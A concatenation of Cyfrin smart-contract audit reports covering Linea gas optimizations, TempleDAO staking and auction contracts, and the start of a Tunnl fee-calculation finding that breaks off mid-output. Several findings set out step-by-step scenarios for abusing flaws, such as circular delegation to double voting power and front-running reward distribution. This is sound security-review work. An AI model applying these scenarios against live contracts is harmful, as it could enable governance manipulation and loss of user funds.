    if (nativeToBridgedToken[sourceChainIdCache][_token] != RESERVED_STATUS) revert NotReserved(_token);
    nativeToBridgedToken[sourceChainIdCache][_token] = EMPTY;
  }
```

**Linea:**
Fixed in commit [35c7807](https://github.com/Consensys/zkevm-monorepo/commit/35c7807756ccac2756be7da472f5e6ce0fd9b16a#diff-e5dcf44cdbba69f5a1f8fc58700577ce57caac0c15a5d5fb63e0620aeced62d4L367-R367) merged in [PR3249](https://github.com/Consensys/zkevm-monorepo/pull/3249/files#diff-e5dcf44cdbba69f5a1f8fc58700577ce57caac0c15a5d5fb63e0620aeced62d4L367-R370).

**Cyfrin:** Verified.


### Save 1 storage read in `L2MessageServiceV1::setMinimumFee` by emitting `MinimumFeeChanged` event using `_feeInWei` parameter

**Description:** Save 1 storage read in `L2MessageServiceV1::setMinimumFee` by emitting the `MinimumFeeChanged` event using the `_feeInWei` parameter eg:
```solidity
  function setMinimumFee(uint256 _feeInWei) external onlyRole(MINIMUM_FEE_SETTER_ROLE) {
    uint256 previousMinimumFee = minimumFeeInWei;
    minimumFeeInWei = _feeInWei;

    emit MinimumFeeChanged(previousMinimumFee, _feeInWei, msg.sender);
  }
```

**Linea:**
Acknowledged; will be part of a future release.


### Optimize away `currentPeriodAmountTemp` variable in `RateLimiter::_addUsedAmount`

**Description:** Optimize away `currentPeriodAmountTemp` in `RateLimiter::_addUsedAmount` by for example:
```solidity
  function _addUsedAmount(uint256 _usedAmount) internal {
    // @audit removed `currentPeriodAmountTemp`

    if (currentPeriodEnd < block.timestamp) {
      currentPeriodEnd = block.timestamp + periodInSeconds;
      // @audit removed assignment `currentPeriodAmountTemp = _usedAmount`
    } else {
      // @audit modifying `_usedAmount` instead of `currentPeriodAmountTemp`
      _usedAmount += currentPeriodAmountInWei;
    }

    // @audit use `_usedAmount` in check
    if (_usedAmount > limitInWei) {
      revert RateLimitExceeded();
    }

    // @audit use `_usedAmount` in assignment
    currentPeriodAmountInWei = _usedAmount;
  }
```

**Linea:**
Acknowledged; may be part of a future release.


### Optimize away `usedLimitAmountToSet`, `amountUsedLoweredToLimit` and `usedAmountResetToZero` variables in `RateLimiter::resetRateLimitAmount`

**Description:** Optimize away  `usedLimitAmountToSet`, `amountUsedLoweredToLimit` and `usedAmountResetToZero` variables in `RateLimiter::resetRateLimitAmount` by for example:
```solidity
  function resetRateLimitAmount(uint256 _amount) external onlyRole(RATE_LIMIT_SETTER_ROLE) {
    // @audit remove `usedLimitAmountToSet`, `amountUsedLoweredToLimit` and `usedAmountResetToZero`

    // @audit update this first as this always happens
    limitInWei = _amount;

    if (currentPeriodEnd < block.timestamp) {
      currentPeriodEnd = block.timestamp + periodInSeconds;
      // @audit remove assignment to `usedAmountResetToZero` and instead directly set
      // `currentPeriodAmountInWei` to zero instead of doing it later
      currentPeriodAmountInWei = 0;

      // @audit emitting event here as boolean variables removed
      emit LimitAmountChanged(_msgSender(), _amount, false, true);
    }
    // @audit refactor `else/if` statement to simplify
    else if(_amount < currentPeriodAmountInWei) {
        // @audit remove assignment usedLimitAmountToSet = _amount
        // @audit remove assignemnt to `amountUsedLoweredToLimit` and instead directly
        // set `currentPeriodAmountInWei` to `_amount` instead of doing it later
        currentPeriodAmountInWei = _amount;

        // @audit emitting event here as boolean variables removed
        emit LimitAmountChanged(_msgSender(), _amount, true, false);
    }
    // @audit new `else` condition to emit event for when
    // neither boolean was true
    else{
      emit LimitAmountChanged(_msgSender(), _amount, false, false);
    }
  }
```

Alternatively only optimize away the `usedLimitAmountToSet` variable:
```solidity
  function resetRateLimitAmount(uint256 _amount) external onlyRole(RATE_LIMIT_SETTER_ROLE) {
    // @audit remove `usedLimitAmountToSet`
    bool amountUsedLoweredToLimit;
    bool usedAmountResetToZero;

    if (currentPeriodEnd < block.timestamp) {
      currentPeriodEnd = block.timestamp + periodInSeconds;
      usedAmountResetToZero = true;
    } else {
      if (_amount < currentPeriodAmountInWei) {
        // @audit remove assignment usedLimitAmountToSet = _amount
        amountUsedLoweredToLimit = true;
      }
    }

    limitInWei = _amount;

    // @audit refactor if statement to handle zero case
    if(usedAmountResetToZero) currentPeriodAmountInWei = 0;
    // @audit use `_amount` for assignment instead of `usedLimitAmountToSet`
    else if(amountUsedLoweredToLimit) currentPeriodAmountInWei = _amount;

    emit LimitAmountChanged(_msgSender(), _amount, amountUsedLoweredToLimit, usedAmountResetToZero);
  }
```

**Linea:**
Acknowledged; will be part of a future release.


### Remove deprecated `SubmissionDataV2::dataParentHash` and `SupportingSubmissionDataV2::dataParentHash` from `ILineaRollup.sol`

**Description:** Remove deprecated `SubmissionDataV2::dataParentHash` and `SupportingSubmissionDataV2::dataParentHash` from `ILineaRollup.sol`.

These are hangovers from the previous implementation and should be removed; in the current `LineaRollup.sol` `dataParentHash` is only copied from `calldata` into `memory` in `submitDataAsCalldata` but is not actually used for anything.

**Linea:**
Fixed in commit [2261c78](https://github.com/Consensys/zkevm-monorepo/pull/3191/commits/2261c7841c24f17b4174ec234166912f6c47a1e1#diff-00fe7f4d2727f66fbd6b2e24a070b5c3783c70f0c8e838bc33a9c2f809eabd27L21) merged in [PR3191](https://github.com/Consensys/zkevm-monorepo/pull/3191/files#diff-00fe7f4d2727f66fbd6b2e24a070b5c3783c70f0c8e838bc33a9c2f809eabd27L21).

**Cyfrin:** Verified.


### Remove deprecated check from `LineaRollup::submitDataAsCalldata`

**Description:** In commit 9840265eeb7d8ed9a4a5107b7fad056093b224e0 the check which reverted with error `WrongParentShnarfFinalBlockNumber` was [removed](https://github.com/Consensys/zkevm-monorepo/commit/9840265eeb7d8ed9a4a5107b7fad056093b224e0#diff-408c766d202f05efdde69ebcd815ba16ad10f68249dd353f6359121ab312a9fbL229-L234) from `submitBlobs`, and the test which caught that error was also [updated](https://github.com/Consensys/zkevm-monorepo/commit/9840265eeb7d8ed9a4a5107b7fad056093b224e0#diff-e503dae0dab65006b7464f1028b4605cf972c99ff7a41345d050b350c3568096L426) to catch a different error `DataStartingBlockDoesNotMatch`.

However, that same check is still [present](https://github.com/Consensys/zkevm-monorepo/blob/oz-2024-04-22-audit-code/contracts/contracts/LineaRollup.sol#L295-L300) in `submitDataAsCalldata` but now there is no test in `LineaRollup.ts` which expects the error `WrongParentShnarfFinalBlockNumber`.

This error is now detected inside `_validateSubmissionData` which reverts with new error `DataStartingBlockDoesNotMatch`. Hence the deprecated check in `submitDataAsCalldata` which reverts with `WrongParentShnarfFinalBlockNumber` is obsolete and can be deleted.

**Recommended Mitigation:** Remove the deprecated check from `submitDataAsCalldata`.

**Linea:**
Fixed in commit [2eba80b](https://github.com/Consensys/zkevm-monorepo/commit/2eba80b7b2fed5e7959d02eae8c451298d8fb7ec#diff-408c766d202f05efdde69ebcd815ba16ad10f68249dd353f6359121ab312a9fbL293-L300) merged in [PR3191](https://github.com/Consensys/zkevm-monorepo/pull/3191/files#diff-408c766d202f05efdde69ebcd815ba16ad10f68249dd353f6359121ab312a9fbL293-L300).

**Cyfrin:** Verified.

\clearpage

------ FILE END car/reports_md/2024-05-24-cyfrin-linea.md ------


------ FILE START car/reports_md/2024-06-17-cyfrin-templedao-v2.1.md ------

**Lead Auditors**

[Hans](https://twitter.com/hansfriese)


**Assisting Auditors**



---

# Findings
## High Risk


### A malicious staker can delay the increase of any delegator's voteWeight as much as he wants

**Description:** When a staker delegates his balance to a delegator, the time duration variable `_weights[delegate].stakeTime` is decreased. However, when undelegating only the balance is decreased. This makes it possible a malicious user can decrease `_weights[delegate].stakeTime`. He can expand the impact of this attack by repeating delegating and undelegating.

**Impact:** A malicious user can delay the increase of any delegator's `voteWeight` as much as he wants.

**Proof of Concept:** Here's an example scenario:

Assume that `HalfTime` is `7`days.
1. Alice delegates `200` to Bob(a victim).
2. `14` days passed. `t` is `14`.
                       Bob's `votePower` is `200*14/(14+7)=133`.
4. Charlie(a malicious user) delegates `100` to Bob. `t` decreases from `14` to `200*14*7/(300*(14+7)-200*14)=5.6`
                       Bob's `votePower` is `300*5.6/(5.6+7)=133`.
5. Charlie undelegates `100` from Bob. `t` is still `5.6`. However, `balance` is decreased from `300` to `200`.
                       Bob's `votePower` is `200*5.6/(5.6+7)=88`.

A malicious user can decrease the `t` as much as he wants by repeating step 3 and 4 in one transaction.
In this way, he can delay the increase of `votePower` as much as he wants. In the worst case, it is possible to limit the `votePower` of any user almost 0 forever.

Note: Two combining ways of delegation (step 3) and undelegation (step 4) are possible.
One is the combination of `setUserVoteDelegate()` and `unsetUserVoteDelegate()`.
Another is the combination of `stake()` and `withdraw()`.

**Recommended Mitigation:** The mechanism for adjusting the stakingTime between delegation and undelegation should be improved.

**TempleDAO:** Fixed in [PR 1041](https://github.com/TempleDAO/temple/pull/1041)

**Cyfrin:** Verified



### Malicious users can double their voting power.

**Description:** When calculating The `voteWeight` of a delegatee, its own `ownVoteWeight` is added. This makes it possible for some users to double their voting power by constructing a cycle. For example, Alice delegates Bob, Bob delegates Alice.

```solidity

    function getDelegatedVoteWeight(address _delegate) external view returns (uint256) {
        // check address is delegate
        uint256 ownVoteWeight = _voteWeight(_delegate, _balances[_delegate]);
        address callerDelegate = userDelegates[_delegate];
        if (!delegates[_delegate] || callerDelegate == msg.sender) { return ownVoteWeight; }
@>      return ownVoteWeight + _voteWeight(_delegate, _delegateBalances[_delegate]);
    }
```

**Impact:** Malicious users can double their voting power.

**Proof of Concept:** Here's an example scenario:
    1. Alice delegated his voting weight 100 to Bob.
    2. Bob delegated his voting weight 200 to Alice.
    3. The total sum of _delegateBalances of Alice and Bob is (100 + 200) + (200 + 100) = 600.

**Recommended Mitigation:** There might be several ways to mitigate the issue, here's a few:

-The first way

Delegating itself should not be allowed.

```diff

-   function unsetUserVoteDelegate() external override {
+   function unsetUserVoteDelegate() public override {

    function setSelfAsDelegate(bool _approve) external override {
            [...]
+       if (_approve && !prevStatusTrue) unsetUserVoteDelegate();
    }
```

And, any delegatee should not be allowed to delegate.

```diff

    function setUserVoteDelegate(address _delegate) external override {
        if (_delegate == address(0)) { revert CommonEventsAndErrors.InvalidAddress(); }
        if (!delegates[_delegate]) {  revert InvalidDelegate(); }
+       if (userDelegates[msg.sender] == msg.sender) { revert(); }
            [...]
    }

```

-The second way

`ownVoteWeight` should not be add, unless if a user delegate himself. This is the typical way for calculationg woting power.

```diff

    function getDelegatedVoteWeight(address _delegate) external view returns (uint256) {
        // check address is delegate
-       uint256 ownVoteWeight = _voteWeight(_delegate, _balances[_delegate]);
-       address callerDelegate = userDelegates[_delegate];
-       if (!delegates[_delegate] || callerDelegate == msg.sender) { return ownVoteWeight; }
-       return ownVoteWeight + _voteWeight(_delegate, _delegateBalances[_delegate]);
        return _voteWeight(_delegate, _delegateBalances[_delegate]);
    }

```

**TempleDAO:** Fixed in [PR 1040](https://github.com/TempleDAO/temple/pull/1040)

**Cyfrin:** Verified


### The delegator resetting self-delegation causes multiple issues in the protocol

**Description:** Whenever the vote power of delegators are changed, the validity of self-delegation of the delegator is not checked, which results in issues in multiple parts of the protocol.

- `unsetUserVoteDelegate`: It does not allow stakers to unset delegation through the function because it tries to subtract delegated balance from zero.
- `_withdrawFor`: It does not allow stakers to withdraw their assets because it tries to subtract delegated balance from zero.
- `_stakeFor`: It allows malicious stakers to get infinite voting power by repeating staking & modifying delegator & withdrawal process.

**Impact:** It allows attackers to repeat issues in `_stakeFor` to accumulate voting power, also it causes reverts in withdrawals.

**Proof of Concept:** Here's a scenario where a malicious attacker can get infinite voting power by repeating the following process:

1. Staker delegates to Bob.
2. Bob resets self-delegation.
3. The staker stakes the token.
4. The staker changes the delegation to another party.

**Recommended Mitigation:** In 3 functions above, it should validate if the delegator has self-delegation enabled at the time of function call.

**TempleDAO:** Fixed in [PR 1034](https://github.com/TempleDAO/temple/pull/1034)

**Cyfrin:** Verified

\clearpage
## Medium Risk


### Misconfiguration of minting TGLD leads to max supply amount being minted too fast

**Description:** When minting TGLD through TempleGold contract, the minting amount should be larger than the minimum amount which is 10,000 TGLD. Also if it's the first time that mint happens, the mint amount is always SUPPLY * n/d, which is the amount for one second.

The math above shows that the minting amount per second should be bigger than 10,000 TGLD, which also means that the max supply(1e9 TGLD) gets minted in 1e5 seconds ~ 1day 4hrs.

**Impact:** Either max supply tokens are minted in 1day 4hrs, or tokens can't be minted for the first minting.

**Recommended Mitigation:** When TGLD contract is created or setVestingFactor is called for the first time, it should initialize `_lastMintTimestamp`.

**TempleDAO:** Fixed in [PR 1026](https://github.com/TempleDAO/temple/pull/1026)

**Cyfrin:** Verified


### When recoverToken in DaiGoldAction contract is called, it does not update the status

**Description:** recoverToken function moves specific amount of TGLD from the auction contract to another and delete last epoch so that it can be reset and restart.
The tokens get moved but the status nextAuctionGoldAmount is not subtracted, and this gives incorrect amount of TLGD tokens to the next epoch, and as a result, the bidders won't be able to claim their TGLD.

**Impact:** The next auction has incorrect number as auction amount which results in users not being able to claim tokens after the auction ends.

**Recommended Mitigation:** The nextAuctionGoldAmount should be subtracted when tokens are moved in recoverToken function.

**TempleDAO:** Fixed in [PR 1027](https://github.com/TempleDAO/temple/pull/1027)

**Cyfrin:** Verified


### In staking contract, rewards distribution can be delayed by front-running distributeGold function

**Description:** In `TempleGoldStaking` contract, the reward distributer calls `distributeRewards` to by minting available TLGD from the token contract and updates reward rate based on the minted amount.
However, the distribution works only after the distribution cooldown period is passed:
```Solidity
if (lastRewardNotificationTimestamp + rewardDistributionCoolDown > block.timestamp)
    { revert CannotDistribute(); }
```

It uses `lastRewardNotificationTimestamp` as latest updated timestamp, which can be also updated by anyone who calls a public function `distributeGold`.
By front-running this function, it prevents the distributor from updating reward rate.

More seriously, if `distributeGold` is called regularly before the distribution cooldown, rewards distribution can be prevented forever.

**Impact:** Reward distribution can be delayed.

**Recommended Mitigation:** Either making `distributeGold` permissioned or introduce other state variable that represents the latest timestamp of rewards distribution, which is only updated in `distributeRewards` function.

**TempleDAO:** Fixed in [PR 1028](https://github.com/TempleDAO/temple/pull/1028)

**Cyfrin:** Verified


### Configuring compose option will prevent users from receiving TGLD on the destination chain

**Description:** Users are able to send their TGLD by calling `send` function of TempleGold contract.
Since `SendParam` struct is passed from users, they can add any field including compose data into the message.
However on the destination chain, in `_lzReceive` function, it blocks messages with compose options in it:
```Solidity
if (_message.isComposed()) { revert CannotCompose(); }
```

This means that users who call `send` with compose option, they will not receive TGLD tokens on the destination chain.

**Impact:** Token transfer does not work based on the parameter and causes loss of funds for users.

**Recommended Mitigation:**
1. In `send` function, if the `_sendParam` includes compose option, it should revert.
2. Even better, `send` function only inputs mandatory fields from users like the amount to send, and it constructs `SendParam` in it rather than receiving it as a whole from the user.

**TempleDAO:** Fixed in [PR 1029](https://github.com/TempleDAO/temple/pull/1029)

**Cyfrin:** Verified


### In staking contract, resetting self delegation will reset vote weight to zero

**Description:** In `TempleGoldStaking` contract, when a delegate resets self delegation, the vote weights delegated to the delegate will be removed by calling `_updateAccountWeight`.
Since zero is passed as new balance parameter, the `stakingTime` of vote weight is reset to zero:
```solidity
// TempleGoldStaking.sol:L580
if (_newBalance == 0) {
    t = 0;
    _lastShares = 0;
}
```

This means that the delegate's vote weight starts accumulating from zero even though the delegate has their own balance, which should not be decreased.

**Impact:** The delegate loses voting power, even becoming zero if resetting self delegation happens right before an epoch ends.

**Recommended Mitigation:** When resetting self delegation, it should not decrease stakeTime so that delegate's voting power remains based on their own balance

**TempleDAO:** Fixed in [PR 1043](https://github.com/TempleDAO/temple/pull/1043)

**Cyfrin:** Verified


### Incorrect end time setting for spice auction

**Description:** In `startAuction` function of `SpiceAuction` contract, the end time is set wrong.
```solidity
uint128 startTime = info.startTime = uint128(block.timestamp) + config.startCooldown;
uint128 endTime = info.endTime = uint128(block.timestamp) + config.duration;
```
Currently, `endTime` is set using `block.timestamp`, not `startTime` calculated above.

**Impact:** The auction end time becomes shorter than expected.

**Recommended Mitigation:** `endTime` should be calculated using `startTime` and `duration`
```solidity
uint128 endTime = info.endTime = startTime + config.duration;
```

**TempleDAO:** Fixed in [PR 1032](https://github.com/TempleDAO/temple/pull/1032)

**Cyfrin:** Verified


### No token recover mechanism when the auction ends without any bid

**Description:** In `SpiceAuction` contract, when an auction ends with no bids, the auction tokens are locked into the contract and can't be recovered. `recoverToken` function doesn't help recover the auction token because it limits recoverable amount to `balance - totalAllocation`

**Impact:** The auction tokens can be stuck in the contract and can't be recovered, although this would be rare case.

**Recommended Mitigation:** There has to be a mechanism implemented to recover tokens from auctions when it ends without any bids.

**TempleDAO:** Fixed in [PR 1033](https://github.com/TempleDAO/temple/pull/1033)

**Cyfrin:** Verified


### `TempleGoldStaking.getVoteWeight()` calculates vote weight of an account incorrectly

**Description:** The `TempleGoldStaking.sol` contract, the function is expected to return the vote power of account, but sometimes it is calculated incorrectly.
It uses current balance of account from L379.
```solidity
File: contracts\templegold\TempleGoldStaking.sol
378:     function getVoteWeight(address account) external view returns (uint256) {
379:         return _voteWeight(account, _balances[account]);
380:     }
```
However, in the `_voteWeight()` function, it uses previous vote weight when `week > currentWeek` from L556.
Then, it uses current balance and previous vote weight to calculate the vote power from L563.
```solidity
File: contracts\templegold\TempleGoldStaking.sol
549:     function _voteWeight(address _account, uint256 _balance) private view returns (uint256) {
550:         /// @dev Vote weights are always evaluated at the end of last week
551:         /// Borrowed from st-yETH staking contract (https://etherscan.io/address/0x583019fF0f430721aDa9cfb4fac8F06cA104d0B4#code)
552:         uint256 currentWeek = (block.timestamp / WEEK_LENGTH) - 1;
553:         AccountWeightParams storage weight = _weights[_account];
554:         uint256 week = uint256(weight.weekNumber);
555:         if (week > currentWeek) {
556:             weight = _prevWeights[_account];
557:         }
558:         uint256 t = weight.stakeTime;
559:         uint256 updated = weight.updateTime;
560:         if (week > 0) {
561:             t += (block.timestamp / WEEK_LENGTH * WEEK_LENGTH) - updated;
562:         }
563:         return _balance * t / (t + halfTime);
564:     }
```
As a result, it calculates the vote power incorrectly.

**Impact:** TempleGoldStaking.getVoteWeight() calculates vote weight of an account incorrectly.

**Proof of Concept:** Let's suppose `halfTime` is 7 days.
- Alice stakes `100 ether` on May 3.
- Alice stakes `400 ether` again on May 17.
- She calls the `getVoteWeight()` function on May 18.
  The function returns `500 * 13 / (13 + 7)` instead of `100 * 13 / (13 + 7)`, which is 5 times greater than real vote power.

**Recommended Mitigation:** It is recommended to use previous balance of an user when previous vote weight is used in the function.

**TempleDAO:** Fixed in [PR 1043](https://github.com/TempleDAO/temple/pull/1043)

**Cyfrin:** Verified


### Rewards are calculated as distributed even if there are no stakers, locking the rewards forever

**Description:** The `TempleGoldStaking.sol` contract is a fork of the Synthetix rewards distribution contract, with slight modifications. The code special-cases the scenario where there are no users, by not updating the cumulative rate when the _totalSupply is zero, but it does not include such a condition for the tracking of the timestamp from L476.
```solidity
File: contracts\templegold\TempleGoldStaking.sol
475:     function _rewardPerToken() internal view returns (uint256) {
476:         if (totalSupply == 0) {
477:             return rewardData.rewardPerTokenStored;
478:         }
479:
480:         return
481:             rewardData.rewardPerTokenStored +
482:             (((_lastTimeRewardApplicable(rewardData.periodFinish) -
483:                 rewardData.lastUpdateTime) *
484:                 rewardData.rewardRate * 1e18)
485:                 / totalSupply);
486:     }
```
Because of this, even when there are no users staking, the accounting logic still thinks funds were being dispersed during that timeframe (because the starting timestamp is updated),

As a result, if the distributeRewards() function is called prior to there being any users staking, the funds that should have gone to the first stakers will instead accrue to nobody, and be locked in the contract forever.

**Impact:** Non distributed rewards are stuck in the contract.

**Proof of Concept:** Here's an example scenario:
Alice is `distributionStarter` and Bob is a person who wants to stake `Temple`.
- Alice calls the `distributeRewards()` function to mint TGLD for this contract.
  Let's suppose the minted TGLD is `7*86400 ether` to calculate simply. Then `rewardRate` becomes `1 ether`.
- After 24 hours, Bob stakes `10000` TGLD into the contract.
- After 6 days, Bob withdraw all staked TGLD and claim rewards. Then he gets `6*86400 ether`.

As a result, `86400 ether` is locked in the contract.

**Recommended Mitigation:** In the function `distributeRewards()`, check if there are enough reward tokens already in the contract.
```diff
File: contracts\templegold\TempleGoldStaking.sol
245:     function distributeRewards() updateReward(address(0)) external {
246:         if (distributionStarter != address(0) && msg.sender != distributionStarter)
247:             { revert CommonEventsAndErrors.InvalidAccess(); }
248:         // Mint and distribute TGLD if no cooldown set
249:         if (lastRewardNotificationTimestamp + rewardDistributionCoolDown > block.timestamp)
250:                 { revert CannotDistribute(); }
251:         _distributeGold();
252:         uint256 rewardAmount = nextRewardAmount;
253:         if (rewardAmount == 0 ) { revert CommonEventsAndErrors.ExpectedNonZero(); }
254:         nextRewardAmount = 0;
+            if (totalSupply == 0) { revert CommonEventsAndErrors.NoStaker(); }
255:         _notifyReward(rewardAmount);
256:     }
```
```diff
File: contracts\common\CommonEventsAndErrors.sol
06: library CommonEventsAndErrors {
07:     error InsufficientBalance(address token, uint256 required, uint256 balance);
08:     error InvalidParam();
09:     error InvalidAddress();
10:     error InvalidAccess();
11:     error InvalidAmount(address token, uint256 amount);
12:     error ExpectedNonZero();
13:     error Unimplemented();
+       error NoStaker();
14:     event TokenRecovered(address indexed to, address indexed token, uint256 amount);
15: }
```

**TempleDAO:** Fixed in [PR 1037](https://github.com/TempleDAO/temple/pull/1037)

**Cyfrin:** Verified


### While changing vote delegator from himself to another user, `_delegateBalances` should not be decreased

**Description:** In `setUserVoteDelegate` function, when a user set vote delegator to himeself, his `_delegateBalances` value doesn't contain his `userBalance` from L149.
When he changes vote delegator from himself to another user, it subtracts `userBalance` from `_delegateBalances` from L145. But it shouldn't subtract `userBalance`.

```Solidity
File: contracts\templegold\TempleGoldStaking.sol
136:         if (userBalance > 0) {
137:             uint256 _prevBalance;
138:             uint256 _newDelegateBalance;
139:             if (removed) {
140:                 // update vote weight of old delegate
141:                 _prevBalance = _delegateBalances[_userDelegate];
142:                 /// @dev skip for a previous delegate with 0 users delegated and 0 own vote weight
143:                 if (_prevBalance > 0) {
144:                     /// @dev `_prevBalance > 0` because when a user sets delegate, vote weight and `_delegateBalance` are updated for delegate
145:                     _newDelegateBalance = _delegateBalances[_userDelegate] = _prevBalance - userBalance;
146:                     _updateAccountWeight(_userDelegate, _prevBalance, _newDelegateBalance, false);
147:                 }
148:             }
149:             if (msg.sender != _delegate) { // @audit msg.sender == _delegate ?
150:                 /// @dev Reuse variables
151:                 _prevBalance = _delegateBalances[_delegate];
152:                 _newDelegateBalance = _delegateBalances[_delegate] = _prevBalance + userBalance;
153:                 _updateAccountWeight(_delegate, _prevBalance, _newDelegateBalance, true);
154:             }
155:         }

```

**Impact:** `_delegateBalances` is not calculated correctly.

**Recommended Mitigation:** It is recommended to check if previous delegated user is not self.

```diff
File: contracts\templegold\TempleGoldStaking.sol
        if (removed) {
            // update vote weight of old delegate
            _prevBalance = _delegateBalances[_userDelegate];
            /// @dev skip for a previous delegate with 0 users delegated and 0 own vote weight
-           if (_prevBalance > 0) {
+           if (_prevBalance > 0 && _userDelegate != msg.sender) {
                /// @dev `_prevBalance > 0` because when a user sets delegate, vote weight and `_delegateBalance` are updated for delegate
                _newDelegateBalance = _delegateBalances[_userDelegate] = _prevBalance - userBalance;
                _updateAccountWeight(_userDelegate, _prevBalance, _newDelegateBalance, false);
            }
        }
```

**TempleDAO:** Fixed in [PR 1038](https://github.com/TempleDAO/temple/pull/1038)

**Cyfrin:** Verified

\clearpage
## Low Risk


### In rewards distribution, dust amount is left and stuck in the contract

**Description:** When rewards distribution happens, it's distributed over 7 days(604800 seconds), the reward rate is calculated per second, thus every time, the remainder which is less than 604800 wei of tokens are left in the contract.

**Recommended Mitigation:** The left amount of rewards should be added to next round of distribution.

**Temple DAO:**
Fixed in [PR 1046](https://github.com/TempleDAO/temple/pull/1046)

**Cyfrin:** Verified


### DAI-GOLD auction might not get started for last mint of gold tokens

**Description:** Usually minting gold happens when the available amount is bigger than 1e4, which will configure the minimum distribution amount of DaiGoldAuction. However when it reaches the max supply, the minting amount can be smaller than minimum amount, thus DaiGoldAuction might not get started because the amount will be smaller than the minimum distribution amount.

**Recommended Mitigation:** When it reached max supply, it allows to start auction with remaining amount.

**Temple DAO:**
`config.auctionMinimumDistributedGold` is not necessarily equal to the minimum gold mint amount. Also, for the last mint (max supply), `config.auctionMinimumDistributedGold` will be updated.

**Cyfrin:** Acknowledged


### Fee-on-transfer tokens are not supported in spice auction

**Description:** Fee-on-transfer tokens are not supported in spice auction contract, which might result in incorrect calculation in auction tokens.

**Recommended Mitigation:** Use pre/post balance difference to calculate actually moved bid token amount.

**Temple DAO:**
Fixed in [PR 1046](https://github.com/TempleDAO/temple/pull/1046)

**Cyfrin:** Verified


### Current design of TempleGold prevents distribution of tokens

**Description:** With current TempleGold token design, tokens only can be transferred to/from whitelisted addresses. This prevents further distribution of TempleGold tokens where they could be listed on DEXes, put on lending protocols as collateral and so on, which would be impossible because the protocol can not whitelist all the addresses based on user demands.

**Recommended Mitigation:** There should be a whitelist flag, when it is set to true, only whitelisted from/to addresses are accepted and when it is set to false, it should be open.

**Temple DAO:**
Acknowledged, but TempleGold is not traded or used on lending platforms

**Cyfrin:** Acknowledged

\clearpage
## Informational


### Zero addresses not checked in contracts constructors

**Description:** In constructors of `DaiGoldAuction`, `TempleGold`, and `TempleGoldStaking` contracts, zero addresses are not validated.


### Redundant logic of `send` function of `TempleGold` contract

**Description:** The `send` function is a copy of `send` in `OFTCore`, only destination address is validated. This can be updated using `super.send`.



### Over-complicated design of delegation

**Description:** In staking contract, the logic around delegation is over-complicated, where it has concepts of `delegation`, `self-delegation`, and `delegation to self`, of these logic mixed, which could be simplified.


### TempleGold incompatibility with some chains

**Description:** Because of `PUSH0` not supported in 0.8.19 or lower versions of solidity compiler, TempleGold will be incompatible with chains like Linea where it only supports solidity compiler 0.8.19 or lower.

\clearpage

------ FILE END car/reports_md/2024-06-17-cyfrin-templedao-v2.1.md ------


------ FILE START car/reports_md/2024-07-01-cyfrin-tunnl-v2.0.md ------

**Lead Auditors**

[Hans](https://twitter.com/hansfriese)

**Assisting Auditors**



---

# Findings
## Critical Risk


### Math error in creator payment calculation

**Description:** The Tunnl protocol applies 3 kinds of fees.
- **Flat Fee**: The advertiser pays a flat fee and it is charged on acceptance of offers.
- **Advertiser Percentage Fee**: The advertiser percentage fee is the percentage fee that is charged to the advertiser. It is an extra amount added to the offer value.
- **Creator Percentage Fee**: The creator percentage fee is the percentage fee that is charged to the creator. It is charged based on the amount the creator is paid.

The advertisers create offers starting from a maximum offer amount $maxOfferAmount$ and the total amount including all posssible fees are calculated as $maxOfferAmount * (1 + advertiserFee)+flatFee$.
This amount is stored in the `Offer::maxValueUsdc` and used in many places for accounting.

After a successful verification, `TunnlTwitterOffers::sendFunctionsRequest()` is called to get the actual amount that should be paid to the creator.
This function calls a function `FunctionClient::_sendRequest()` with the request and the maximum offer amount is encoded in the request arguments.
But in the calculation of `maxCreatorPayment`, `s_config.creatorFeePercentageBP` is used instead of `s_config.advertiserFeePercentageBP`.
```solidity
        uint256 maxCreatorPayment = uint256((s_offers[offerId].maxValueUsdc - s_offers[offerId].flatFeeUsdc) * 10000)
            / uint256(10000 + s_config.creatorFeePercentageBP);//@audit-issue this should be 10000+s_config.advertiserFeePercentageBP

        console.log("maxCreatorPayment: %s", maxCreatorPayment);//@audit-info

        bytes[] memory bytesArgs = new bytes[](4);
        bytesArgs[0] = abi.encode(offerId);
        bytesArgs[1] = abi.encodePacked(s_offers[offerId].creationDate);
        bytesArgs[2] = abi.encodePacked(maxCreatorPayment);//@audit-info maximum offer amount relayed
        bytesArgs[3] = abi.encodePacked(s_offers[offerId].offerDurationSeconds);
        req.setBytesArgs(bytesArgs);

        bytes32 requestId = _sendRequest(
            req.encodeCBOR(),
            s_config.functionsSubscriptionId,
            s_config.functionsCallbackGasLimit,
            s_config.functionsDonId
        );
```
The current implementation does not change the payment according to the performance of the content (e.g. likes, views, ... ) and the relayed maximum amount is fully paid to the creator. Hence, the final payment to the creator is being wrong.

This error can lead to two kinds of problems.
- If `creatorFeePercentageBP<advertiserFeePercentageBP`, `maxCreatorPayment` becomes larger than the actual maximum offered amount and the payment distribution in the function `TunnlTwitterOffers::fulfillRequest` will revert with `Exceeds max` error.
- If `creatorFeePercentageBP>advertiserFeePercentageBP`, `maxCreatorPayment` becomes less than the actual maximum offered amount and the creator gets paid less amount.

Note that the current test suite belongs to the first case but the errors are not caught because request fulfillment is simulated with an artificial value rather than the actual value that is set by the nodes using the `calculatepayment.js` script.
```solidity
    function test_PayOut() public {
        // Define the amount to be paid in USDC
        uint256 amountPaidUsdc = uint256(uint256(100e6));
        test_Verification_Success();
        // Warp time for payout and perform Chainlink automation
        vm.warp(block.timestamp + (1 weeks - 100));
        performUpkeep();
        // Fulfill request for payout  with PayOutamount
        mockFunctionsRouter.fulfill(
            address(tunnlTwitterOffers),
            functionsRequestIds[offerId],
            abi.encode(amountPaidUsdc),//@audit-info should be same to the maxCreatorPayout in the current implementation
            ""
        );

        // Assert balances after payout
        assertEq(mockUsdcToken.balanceOf(advertiser), 0);
        assertEq(mockUsdcToken.balanceOf(address(tunnlTwitterOffers)), (0));
        assertEq(
            mockUsdcToken.balanceOf(contentCreator),
            amountPaidUsdc - (amountPaidUsdc * tunnlTwitterOffers.getConfig().creatorFeePercentageBP) / 10000
        );
    }
```

**Impact:** We evaluate the impact to be CRITICAL because the protocol will not function at all or the creator gets less amount than offered systematically.

**Proof Of Concept:**
Because it is not easy to check the actual `maxCreatorPayment` value that is set as a request argument, we inserted a line to log its value in the function `TunnlTwitterOffers::sendFunctionsRequest()`.

```solidity
console.log("maxCreatorPayment: %s", maxCreatorPayment);
```
Running the test case `test_PayOut()` outputs as below.

```bash
[PASS] test_PayOut() (gas: 531524)
Logs:
  100000000 110000000 <- Max offered amount and maxValueUsdc
